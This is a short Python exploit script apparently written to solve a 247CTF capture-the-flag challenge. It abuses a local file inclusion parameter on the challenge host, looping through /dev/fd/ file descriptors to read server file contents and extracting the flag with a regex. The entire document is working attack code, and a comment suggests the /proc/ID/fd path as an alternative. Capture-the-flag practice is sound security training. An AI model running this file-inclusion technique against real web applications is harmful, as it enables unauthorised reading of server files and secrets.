import requests
import sys
import re

if(len(sys.argv) < 2):
    print("python3 exploit.py instance_number")
    sys.exit()

url = f"https://{sys.argv[1]}.247ctf.com"

path = "/dev/fd/"
# Could also check for /proc/ID/fd/ID but exceeds the char number
for i in range(99):
    r = requests.get(f"{url}/?include={path}{i}")
    if re.search("247CTF{\w*}",r.text):
        flag = re.search("247CTF{\w*}",r.text).group(0)
        print(flag)